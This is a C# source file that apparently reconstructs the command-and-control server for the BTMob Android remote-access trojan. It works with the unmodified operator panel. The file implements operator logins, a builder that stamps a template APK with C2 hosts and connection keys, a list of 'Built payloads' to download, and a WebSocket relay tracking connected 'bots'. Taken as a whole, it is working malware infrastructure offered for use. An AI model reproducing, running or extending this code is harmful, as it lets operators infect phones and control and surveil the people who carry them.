// Program.cs — OpenRATS reconstruction of the BTMob "BT server".
//
// The panel (Btmob.exe reconstruction in ../BtMob) talks to the vendor
// server over two channels:
//
//  HTTP  http://<server>/yaarsa/...  (BTConst: rootdir, api_login, ...)
//  WS    ws://<server>:8080          (BTConst.socketapi, WebSocketClient.cs)
//
// This program implements both, drop-in compatible with the unmodified
// panel. All endpoint paths and JSON shapes below are cited from the
// decompiled panel source; see README.md in this folder for the table.
//
// Admin UI: http://<server>/admin  — add/edit the IP address operators
// connect to, accounts (email/password), connection keys, and build APKs.

using System.Net;
using System.Text;
using System.Text.Json;
using BtServer;

var builder = WebApplication.CreateBuilder(new WebApplicationOptions
{
    // default to port 80 so the panel's http://<ip>/yaarsa/... URLs resolve
    Args = args,
});

// ---- configuration ------------------------------------------------------
ServerConfig config = ServerConfig.Load();
builder.Services.AddSingleton(config);
builder.Services.AddSingleton(new Store(AppContext.BaseDirectory));
builder.Services.AddSingleton<RelayHub>();
builder.Services.AddControllers(); // not used, but keeps the default pipeline intact

// wwwroot holds /yaarsa/user/storage/ built APKs + icons + login page.
builder.WebHost.UseWebRoot("wwwroot");

var app = builder.Build();
Store store = app.Services.GetRequiredService<Store>();
RelayHub hub = app.Services.GetRequiredService<RelayHub>();

// Where built APKs and the template live.
string baseDir = AppContext.BaseDirectory;
string templatePath = Path.Combine(baseDir, "template.apk");
string storageDir = Path.Combine(baseDir, "wwwroot", "yaarsa", "user", "storage");
Directory.CreateDirectory(storageDir);

// ============================================================================
//  Panel HTTP API — paths mirror the vendor PHP endpoints (BTConst.cs)
// ============================================================================

// ---- 1. btlogin.php : operator login --------------------------------------
// Request:  {"mname":"BT-MOB","email":..,"pass":..,"pkey":..,"hid":..,"ran_key":..}
// Response: {"Success":"<AES(ran_key)>"} of {nxtkey,emil,elink,uid,stype,exp}
//           or {"Fail":"<reason>"}
app.MapPost("/yaarsa/private/btlogin.php", async (HttpRequest req) =>
{
    using JsonDocument body = await JsonDocument.ParseAsync(req.Body);
    JsonElement root = body.RootElement;
    string email = Str(root, "email");
    string pass = Str(root, "pass");
    string pkey = Str(root, "pkey");
    string hid = Str(root, "hid");
    string ranKey = Str(root, "ran_key");

    if (config.FindAccount(email) is not { } acc || !config.VerifyPassword(acc, pass))
        return Results.Json(new Dictionary<string, string> { ["Fail"] = "wrong email or password" });

    acc.HardwareId = hid;
    acc.NextKey = AccountRecord.NewNextKey();
    config.Save();

    string payload = JsonSerializer.Serialize(new Dictionary<string, string>
    {
        ["nxtkey"] = acc.NextKey,
        ["emil"] = acc.Email,
        ["elink"] = acc.ShareLink,
        ["uid"] = acc.Uid,
        ["stype"] = acc.Subscription,
        ["exp"] = acc.Expires,
    });
    string cipher = ReplyCrypto.EncryptReply(ranKey, payload);
    return Results.Json(new Dictionary<string, string> { ["Success"] = cipher });
});

// ---- 2. yarsap_58181.php : join/out (WebSocket ticket) ---------------------
// Request:  {"case":"join"|"out","ping":"0"|"1","ismain":"0"|"1","chk":<nextkey>}
//           (5-field variant with usridf when reconnecting — both accepted)
// Response: {"Success":"<panel idf>"} — the idf the panel then presents on
//           the WebSocket (WebSocketClient.Connect stores it via SaveServerIDF).
app.MapPost("/yaarsa/private/yarsap_58181.php", async (HttpRequest req) =>
{
    using JsonDocument body = await JsonDocument.ParseAsync(req.Body);
    JsonElement root = body.RootElement;
    string idf = Guid.NewGuid().ToString("N");
    return Results.Json(new Dictionary<string, string> { ["Success"] = idf });
});

// ---- 3. yarsap_36921.php : store (load/build) ------------------------------
// load:  {"subcom":"load","ran_key":..,"chk":..} -> {"Success":"<AES(ran_key)>"}
//        of [{app_id,app_name,app_size,app_date,app_folder,app_version,app_ico,appstate}]
// build: {"subcom":"build","ran_key":..,"chk":.., conkey,uhost,Ctag,allconf,appid,
//         appname,appversion,ksign,build,...} -> {"Success":"<built app id>"}
// (CommandStore URI-escapes every value — server tolerates both forms.)
app.MapPost("/yaarsa/private/yarsap_36921.php", async (HttpRequest req) =>
{
    using JsonDocument body = await JsonDocument.ParseAsync(req.Body);
    JsonElement root = body.RootElement;
    string subcom = Str(root, "subcom");
    string ranKey = Str(root, "ran_key");

    if (subcom == "load")
    {
        string json = JsonSerializer.Serialize(store.List().Select(e => new Dictionary<string, string>
        {
            ["app_id"] = e.AppId,
            ["app_name"] = e.AppName,
            ["app_size"] = e.AppSize,
            ["app_date"] = e.AppDate,
            ["app_folder"] = e.AppFolder,
            ["app_version"] = e.AppVersion,
            ["app_ico"] = e.AppIco,
            ["appstate"] = e.AppState,
        }));
        string cipher = ReplyCrypto.EncryptReply(ranKey, json);
        return Results.Json(new Dictionary<string, string> { ["Success"] = cipher });
    }

    if (subcom == "build")
    {
        Dictionary<string, string> p = new();
        foreach (JsonProperty prop in root.EnumerateObject())
        {
            string v = prop.Value.ValueKind switch
            {
                JsonValueKind.String => prop.Value.GetString(),
                JsonValueKind.Number => prop.Value.GetRawText(),
                JsonValueKind.True => "1",
                JsonValueKind.False => "0",
                _ => prop.Value.ToString(),
            };
            // undo the panel's Uri.EscapeDataString pass (CommandStore)
            p[prop.Name] = Uri.UnescapeDataString(v ?? "");
        }

        if (!File.Exists(templatePath))
            return Results.Json(new Dictionary<string, string>
                { ["Fail"] = "server template.apk missing — copy it next to BtServer.exe" });

        string appId = p.GetValueOrDefault("appid", "app" + Guid.NewGuid().ToString("N").Substring(0, 8));
        string connKey = p.GetValueOrDefault("conkey", ServerApkBuilder_RandomToken());
        string tag = p.GetValueOrDefault("Ctag", "default");
        string buildName = p.GetValueOrDefault("build", "built");

        try
        {
            string apkPath = ServerApkBuilder.Build(p, templatePath, Path.Combine(storageDir, appId));
            var fi = new FileInfo(apkPath);

            store.Add(new StoreEntry
            {
                AppId = appId,
                AppName = p.GetValueOrDefault("appname", buildName),
                AppSize = fi.Length.ToString(),
                AppDate = DateTime.UtcNow.ToString("yyyy-MM-dd HH:mm"),
                AppFolder = "user/storage/" + appId,
                AppVersion = p.GetValueOrDefault("appversion", "1.0"),
                AppIco = $"user/storage/{appId}/{Path.GetFileName(apkPath)}",
                AppState = "built",
                ApkFileName = Path.GetFileName(apkPath),
                BuiltBy = connKey,
            });

            return Results.Json(new Dictionary<string, string> { ["Success"] = appId });
        }
        catch (Exception ex)
        {
            return Results.Json(new Dictionary<string, string> { ["Fail"] = ex.Message });
        }
    }

    return Results.Json(new Dictionary<string, string> { ["Fail"] = "unknown subcom" });
});

// ---- 4. yarsap_39491.php : store apps list (BTApps) ------------------------
app.MapPost("/yaarsa/private/yarsap_39491.php", async (HttpRequest req) =>
{
    using JsonDocument body = await JsonDocument.ParseAsync(req.Body);
    JsonElement root = body.RootElement;
    string subcom = Str(root, "subcom");
    string ranKey = Str(root, "ran_key");
    if (subcom == "load")
    {
        string json = JsonSerializer.Serialize(store.List().Select(e => new Dictionary<string, string>
        {
            ["app_id"] = e.AppId,
            ["app_name"] = e.AppName,
            ["app_size"] = e.AppSize,
            ["app_date"] = e.AppDate,
            ["app_folder"] = e.AppFolder,
            ["app_ico"] = e.AppIco,
            ["build_state"] = e.AppState,
            ["app_ver"] = e.AppVersion,
        }));
        return Results.Json(new Dictionary<string, string>
            { ["Success"] = ReplyCrypto.EncryptReply(ranKey, json) });
    }
    if (subcom == "delete")
    {
        string appId = Str(root, "appid");
        StoreEntry e = store.List().FirstOrDefault(x => x.AppId == appId);
        if (e != null)
        {
            string dir = Path.Combine(storageDir, appId);
            if (Directory.Exists(dir)) Directory.Delete(dir, true);
            store.Remove(appId);
        }
        return Results.Json(new Dictionary<string, string> { ["Success"] = appId });
    }
    return Results.Json(new Dictionary<string, string> { ["Fail"] = "unknown subcom" });
});

// ---- 5. yarsap_91328.php : custom apps list (BTApps DGVCUSTOM) --------------
app.MapPost("/yaarsa/private/yarsap_91328.php", async (HttpRequest req) =>
{
    using JsonDocument body = await JsonDocument.ParseAsync(req.Body);
    JsonElement root = body.RootElement;
    string subcom = Str(root, "subcom");
    string ranKey = Str(root, "ran_key");
    if (subcom == "load")
    {
        string json = JsonSerializer.Serialize(store.List().Select(e => new Dictionary<string, string>
        {
            ["app_id"] = e.AppId,
            ["app_name"] = e.AppName,
            ["app_size"] = e.AppSize,
            ["app_date"] = e.AppDate,
            ["app_folder"] = e.AppFolder,
            ["app_ico"] = e.AppIco,
            ["build_state"] = e.AppState,
            ["app_ver"] = e.AppVersion,
        }));
        return Results.Json(new Dictionary<string, string>
            { ["Success"] = ReplyCrypto.EncryptReply(ranKey, json) });
    }
    if (subcom == "delete")
    {
        string appId = Str(root, "appid");
        store.Remove(appId);
        return Results.Json(new Dictionary<string, string> { ["Success"] = appId });
    }
    return Results.Json(new Dictionary<string, string> { ["Fail"] = "unknown subcom" });
});

// ---- 6. updater.php : update check + download -------------------------------
// check:   {"subcom":"check","ran_key":..,"chk":..} -> {"Success":"<AES>"} of
//          {version,hash,date,size}
// download:{"subcom":"download",...} -> ZIP bytes (updatewindow.cs)
app.MapPost("/yaarsa/private/updater.php", async (HttpRequest req) =>
{
    using JsonDocument body = await JsonDocument.ParseAsync(req.Body);
    JsonElement root = body.RootElement;
    string subcom = Str(root, "subcom");
    string ranKey = Str(root, "ran_key");

    if (subcom == "check")
    {
        string payload = JsonSerializer.Serialize(new Dictionary<string, string>
        {
            ["version"] = config.Update.Version,
            ["hash"] = config.Update.Hash,
            ["date"] = config.Update.Date,
            ["size"] = config.Update.Size,
        });
        return Results.Json(new Dictionary<string, string>
            { ["Success"] = ReplyCrypto.EncryptReply(ranKey, payload) });
    }

    if (subcom == "download")
    {
        string updateZip = Path.Combine(baseDir, "update.zip");
        if (!File.Exists(updateZip))
            return Results.Json(new Dictionary<string, string> { ["Fail"] = "no update package" });
        return Results.File(File.ReadAllBytes(updateZip), "application/zip", "update.zip");
    }

    return Results.Json(new Dictionary<string, string> { ["Fail"] = "unknown subcom" });
});

// ---- 7. yarsap_2201.php : change password -----------------------------------
// {"opass","npass","npassconf","scode"} -> {"Success":"..."} / {"Fail":"..."}
app.MapPost("/yaarsa/private/yarsap_2201.php", async (HttpRequest req) =>
{
    using JsonDocument body = await JsonDocument.ParseAsync(req.Body);
    JsonElement root = body.RootElement;
    // the ChangePassword callers send the account email in "scode" or in the
    // session — accept either; fall back to the first account for simplicity.
    string email = Str(root, "scode") ?? Str(root, "email") ?? config.Accounts[0].Email;
    var acc = config.FindAccount(email) ?? config.Accounts[0];
    string opass = Str(root, "opass");
    string npass = Str(root, "npass");
    string conf = Str(root, "npassconf");

    if (!config.VerifyPassword(acc, opass))
        return Results.Json(new Dictionary<string, string> { ["Fail"] = "old password wrong" });
    if (npass != conf)
        return Results.Json(new Dictionary<string, string> { ["Fail"] = "passwords do not match" });

    acc.PasswordSha256 = ServerConfig.Sha256Hex(npass);
    config.Save();
    return Results.Json(new Dictionary<string, string> { ["Success"] = "password changed" });
});

// ---- 8. yarsap_45071.php : account API (upload app/key) --------------------
// multipart POST with fields + "file" (useraccount.AddApp/AddIcon)
app.MapPost("/yaarsa/private/yarsap_45071.php", async (HttpRequest req) =>
{
    if (!req.HasFormContentType)
        return Results.Json(new Dictionary<string, string> { ["Fail"] = "multipart expected" });
    IFormCollection form = await req.ReadFormAsync();
    string type = form["type"].ToString();
    IFormFile file = req.Form.Files.GetFile("file");

    if (file == null)
        return Results.Json(new Dictionary<string, string> { ["Fail"] = "no file" });

    string dir = type == "icon" ? Path.Combine(storageDir, "icons") : storageDir;
    Directory.CreateDirectory(dir);
    string target = Path.Combine(dir, Path.GetFileName(file.FileName));
    await using (var fs = File.Create(target))
        await file.CopyToAsync(fs);

    return Results.Json(new Dictionary<string, string>
        { ["Success"] = $"user/storage/{Path.GetFileName(file.FileName)}" });
});

// ---- 9. loginbt3.php : the WebView2 login page -------------------------------
// The panel navigates a WebView2 here and auto-fills #email, #password and
// #bt-key-input, then clicks #login-button. A plain HTML page that performs
// the same btlogin.php POST keeps that flow working.
app.MapGet("/yaarsa/user/loginbt3.php", () => Results.Content(LoginPageHtml(), "text/html; charset=utf-8"));
app.MapPost("/yaarsa/user/loginbt3.php", async (HttpRequest req) =>
{
    IFormCollection form = await req.ReadFormAsync();
    string email = form["email"].ToString();
    string pass = form["password"].ToString();
    string pin = form["bt-key-input"].ToString();

    AccountRecord acc = config.FindAccount(email);
    if (acc == null || !config.VerifyPassword(acc, pass))
        return Results.Content(LoginPageHtml(), "text/html; charset=utf-8"); // page stays

    // Success: redirect into the main site root; the panel detects the
    // completed navigation and switches to its own WebSocket flow.
    return Results.Redirect("/yaarsa/user/", permanent: false);
});
app.MapGet("/yaarsa/user/", () => Results.Content(
    "<html><body style='background:#060a0f;color:#02b075;font-family:Segoe UI;padding:40px'>" +
    "<h2>BT Server (OpenRATS)</h2><p>Logged in. You can close this page and return to the panel.</p>" +
    "</body></html>", "text/html; charset=utf-8"));

// ---- 10. static files: built APKs, icons, template --------------------------
// BTApps composes http://<server>/yaarsa/ + app_ico (or rootdir_storage +
// path, which is http://<server>/yaarsa/user/storage/).
app.UseStaticFiles(new StaticFileOptions
{
    FileProvider = new Microsoft.Extensions.FileProviders.PhysicalFileProvider(
        Path.Combine(baseDir, "wwwroot")),
    RequestPath = "",
});

// ============================================================================
//  Admin UI — http://<server>/admin
// ============================================================================

app.MapGet("/admin", () => Results.Content(AdminPageHtml(hub, config, store), "text/html; charset=utf-8"));

app.MapPost("/admin/keys", async (HttpRequest req) =>
{
    IFormCollection form = await req.ReadFormAsync();
    string action = form["action"].ToString();
    string key = form["key"].ToString();
    if (action == "add" && !string.IsNullOrWhiteSpace(key))
    {
        config.ConnectionKeys[key] = form["note"].ToString();
        config.Save();
    }
    else if (action == "remove" && !string.IsNullOrWhiteSpace(key))
    {
        config.ConnectionKeys.Remove(key);
        config.Save();
    }
    return Results.Redirect("/admin");
});

app.MapPost("/admin/accounts", async (HttpRequest req) =>
{
    IFormCollection form = await req.ReadFormAsync();
    string action = form["action"].ToString();
    if (action == "add")
    {
        string email = form["email"].ToString();
        string pass = form["password"].ToString();
        if (!string.IsNullOrWhiteSpace(email) && !string.IsNullOrWhiteSpace(pass) &&
            config.FindAccount(email) == null)
        {
            config.Accounts.Add(new AccountRecord
            {
                Email = email,
                PasswordSha256 = ServerConfig.Sha256Hex(pass),
                PinKey = form["pin"].ToString(),
                Subscription = string.IsNullOrWhiteSpace(form["subscription"]) ? "lifetime" : form["subscription"].ToString(),
                Expires = string.IsNullOrWhiteSpace(form["expires"]) ? "2099-12-31" : form["expires"].ToString(),
                ShareLink = Guid.NewGuid().ToString("N").Substring(0, 16),
            });
            config.Save();
        }
    }
    else if (action == "remove")
    {
        config.Accounts.RemoveAll(a => a.Email == form["email"].ToString());
        config.Save();
    }
    return Results.Redirect("/admin");
});

app.MapPost("/admin/build", async (HttpRequest req) =>
{
    IFormCollection form = await req.ReadFormAsync();
    string conkey = form["conkey"].ToString();
    string uhost = form["uhost"].ToString();
    string tag = form["Ctag"].ToString();
    string appid = form["appid"].ToString();
    string appname = form["appname"].ToString();
    string appversion = form["appversion"].ToString();
    string allconf = form["allconf"].ToString();

    if (string.IsNullOrWhiteSpace(conkey) || string.IsNullOrWhiteSpace(uhost))
        return Results.Content(AdminPageHtml(hub, config, store, "connection key and host are required"),
            "text/html; charset=utf-8");
    if (!config.ConnectionKeys.ContainsKey(conkey))
        return Results.Content(AdminPageHtml(hub, config, store, "unknown connection key"),
            "text/html; charset=utf-8");
    if (!File.Exists(templatePath))
        return Results.Content(AdminPageHtml(hub, config, store,
            "template.apk missing — copy it next to BtServer.exe"), "text/html; charset=utf-8");

    var p = new Dictionary<string, string>
    {
        ["conkey"] = conkey,
        ["uhost"] = uhost,
        ["Ctag"] = string.IsNullOrWhiteSpace(tag) ? "default" : tag,
        ["appid"] = string.IsNullOrWhiteSpace(appid) ? "openrats." + Guid.NewGuid().ToString("N").Substring(0, 8) : appid,
        ["appname"] = string.IsNullOrWhiteSpace(appname) ? "App" : appname,
        ["appversion"] = string.IsNullOrWhiteSpace(appversion) ? "1.0" : appversion,
        ["build"] = string.IsNullOrWhiteSpace(appname) ? "built" : appname,
        ["allconf"] = string.IsNullOrWhiteSpace(allconf)
            ? "0|0[*]1|1[*]1|1[*]1|1[*]0|0[*]0|0[*]1|1[*]1|1[*]1|1[*]1|1[*]0|0[*]1|1[*]0|0[*]0|0[*]0|0[*]0|0|0|0[*]0|0[*]0|0[*]0|0[*]1|1"
            : allconf,
    };

    try
    {
        string apkPath = ServerApkBuilder.Build(p, templatePath, Path.Combine(storageDir, p["appid"]));
        var fi = new FileInfo(apkPath);
        store.Add(new StoreEntry
        {
            AppId = p["appid"],
            AppName = p["appname"],
            AppSize = fi.Length.ToString(),
            AppDate = DateTime.UtcNow.ToString("yyyy-MM-dd HH:mm"),
            AppFolder = "user/storage/" + p["appid"],
            AppVersion = p["appversion"],
            AppIco = $"user/storage/{p["appid"]}/{fi.Name}",
            AppState = "built",
            ApkFileName = fi.Name,
            BuiltBy = conkey,
        });
        return Results.Redirect("/admin", permanent: false);
    }
    catch (Exception ex)
    {
        return Results.Content(AdminPageHtml(hub, config, store, "build failed: " + ex.Message),
            "text/html; charset=utf-8");
    }
});

// ============================================================================
//  WebSocket relay — ws://<server>:8080
// ============================================================================
var wsServer = new HttpListener();
wsServer.Prefixes.Add($"http://+:{config.WebSocketPort}/");
_ = Task.Run(async () =>
{
    wsServer.Start();
    app.Logger.LogInformation("WebSocket relay listening on port {Port}", config.WebSocketPort);
    while (true)
    {
        HttpListenerContext ctx;
        try { ctx = await wsServer.GetContextAsync(); }
        catch { break; }
        _ = Task.Run(async () =>
        {
            if (!ctx.Request.IsWebSocketRequest) { ctx.Response.Close(); return; }
            try
            {
                System.Net.WebSockets.HttpListenerWebSocketContext ws =
                    await ctx.AcceptWebSocketAsync(null);
                string ip = ctx.Request.RemoteEndPoint?.Address.ToString() ?? "0.0.0.0";
                await hub.RunConnectionAsync(ws.WebSocket, ip);
            }
            catch { /* handshake failure */ }
        });
    }
});

app.Run();

static string Str(JsonElement e, string name)
{
    if (e.ValueKind == JsonValueKind.Object && e.TryGetProperty(name, out var v))
    {
        return v.ValueKind switch
        {
            JsonValueKind.String => v.GetString(),
            JsonValueKind.Number => v.GetRawText(),
            JsonValueKind.True => "1",
            JsonValueKind.False => "0",
            _ => null,
        };
    }
    return null;
}

static string ServerApkBuilder_RandomToken()
{
    const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    byte[] buf = System.Security.Cryptography.RandomNumberGenerator.GetBytes(16);
    var sb = new StringBuilder(16);
    foreach (byte b in buf) sb.Append(chars[b % chars.Length]);
    return sb.ToString();
}

// ============================================================================
//  HTML pages
// ============================================================================

static string LoginPageHtml() => """
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>BT Server — Login</title>
<style>
 body{background:#060a0f;color:#e6edf3;font-family:'Segoe UI',Arial;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
 .card{background:#0e1621;padding:32px;border-radius:10px;width:320px}
 input{width:100%;box-sizing:border-box;margin:8px 0;padding:10px;border-radius:6px;border:1px solid #24303f;background:#060a0f;color:#e6edf3}
 button{width:100%;margin-top:12px;padding:10px;border:none;border-radius:6px;background:#02b075;color:#04140c;font-weight:600;cursor:pointer}
</style>
</head>
<body>
 <div class="card">
  <h3 style="margin-top:0">BT Server (OpenRATS)</h3>
  <form method="post" action="/yaarsa/user/loginbt3.php">
   <input id="email" name="email" type="email" placeholder="Email" autocomplete="off"/>
   <input id="password" name="password" type="password" placeholder="Password"/>
   <input id="bt-key-input" name="bt-key-input" type="text" placeholder="Server key (optional)"/>
   <button id="login-button" type="submit">Login</button>
  </form>
 </div>
</body>
</html>
""";

static string AdminPageHtml(RelayHub hub, ServerConfig config, Store store, string error = null)
{
    var sb = new StringBuilder();
    sb.AppendLine("""
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>BT Server — Admin</title>
<style>
 body{background:#060a0f;color:#e6edf3;font-family:'Segoe UI',Arial;margin:0;padding:24px}
 h1,h2{color:#02b075}
 table{border-collapse:collapse;margin:12px 0;min-width:600px}
 th,td{border:1px solid #24303f;padding:6px 10px;text-align:left;font-size:14px}
 th{background:#0e1621}
 form{display:inline}
 input,select{background:#060a0f;color:#e6edf3;border:1px solid #24303f;border-radius:4px;padding:6px;margin:2px}
 button{background:#02b075;border:none;border-radius:4px;color:#04140c;font-weight:600;padding:6px 14px;margin:2px;cursor:pointer}
 .err{color:#ff6b6b}
 .ok{color:#02b075}
 .section{background:#0e1621;border-radius:10px;padding:16px;margin:16px 0}
</style>
</head>
<body>
<h1>BT Server — Admin (OpenRATS)</h1>
""");
    if (error != null) sb.AppendLine($"<p class='err'>{System.Net.WebUtility.HtmlEncode(error)}</p>");
    sb.AppendLine($"<p>HTTP API port: <b>{config.HttpPort}</b> &nbsp; WebSocket relay: <b>ws://&lt;this host&gt;:{config.WebSocketPort}</b> &nbsp; panels online: <b>{hub.PanelCount}</b>, bots: <b>{hub.BotCount}</b></p>");

    // ---- connection keys ----
    sb.AppendLine("<div class='section'><h2>Connection keys (conkey)</h2>");
    sb.AppendLine("<p>The ApkMaker 'connection key' field and the bots' <code>cokey</code> must be one of these.</p><table><tr><th>Key</th><th>Note</th><th></th></tr>");
    foreach (var kv in config.ConnectionKeys)
        sb.AppendLine($"<tr><td>{System.Net.WebUtility.HtmlEncode(kv.Key)}</td><td>{System.Net.WebUtility.HtmlEncode(kv.Value)}</td>" +
                      $"<td><form method='post' action='/admin/keys'><input type='hidden' name='action' value='remove'/><input type='hidden' name='key' value='{kv.Key}'/><button>Remove</button></form></td></tr>");
    sb.AppendLine("</table><form method='post' action='/admin/keys'>");
    sb.AppendLine("<input type='hidden' name='action' value='add'/>");
    sb.AppendLine("<input name='key' placeholder='new key (e.g. mykey123)'/> <input name='note' placeholder='note'/> <button>Add key</button></form></div>");

    // ---- accounts ----
    sb.AppendLine("<div class='section'><h2>Operator accounts</h2><table><tr><th>Email</th><th>Subscription</th><th>Expires</th><th>Share link</th><th></th></tr>");
    foreach (AccountRecord acc in config.Accounts)
        sb.AppendLine($"<tr><td>{System.Net.WebUtility.HtmlEncode(acc.Email)}</td><td>{acc.Subscription}</td><td>{acc.Expires}</td><td>{acc.ShareLink}</td>" +
                      $"<td><form method='post' action='/admin/accounts'><input type='hidden' name='action' value='remove'/><input type='hidden' name='email' value='{acc.Email}'/><button>Remove</button></form></td></tr>");
    sb.AppendLine("</table><form method='post' action='/admin/accounts'>");
    sb.AppendLine("<input type='hidden' name='action' value='add'/>");
    sb.AppendLine("<input name='email' placeholder='email'/> <input name='password' placeholder='password' type='password'/>");
    sb.AppendLine("<input name='pin' placeholder='PIN (optional)'/> <input name='subscription' placeholder='lifetime'/> <button>Add account</button></form></div>");

    // ---- build ----
    sb.AppendLine("<div class='section'><h2>Build APK</h2>");
    sb.AppendLine("<form method='post' action='/admin/build'>");
    sb.AppendLine("<input name='conkey' placeholder='connection key *'/> <input name='uhost' placeholder='C2 hosts (e.g. 1.2.3.4:8080) *'/><br/>");
    sb.AppendLine("<input name='Ctag' placeholder='client tag'/> <input name='appid' placeholder='package id'/> <br/>");
    sb.AppendLine("<input name='appname' placeholder='app name'/> <input name='appversion' placeholder='1.0'/><br/>");
    sb.AppendLine("<textarea name='allconf' rows='2' cols='80' placeholder='allconf (20 x|y pairs joined by [*])'></textarea><br/>");
    sb.AppendLine("<button>Build APK</button></form></div>");

    // ---- store ----
    sb.AppendLine("<div class='section'><h2>Built payloads</h2><table><tr><th>App</th><th>Package</th><th>Size</th><th>Date</th><th>Download</th></tr>");
    foreach (StoreEntry e in store.List())
        sb.AppendLine($"<tr><td>{System.Net.WebUtility.HtmlEncode(e.AppName)}</td><td>{System.Net.WebUtility.HtmlEncode(e.AppId)}</td><td>{e.AppSize}</td><td>{e.AppDate}</td>" +
                      $"<td><a style='color:#02b075' href='/yaarsa/{e.AppIco}'>apk</a></td></tr>");
    sb.AppendLine("</table></div>");
    sb.AppendLine("</body></html>");
    return sb.ToString();
}
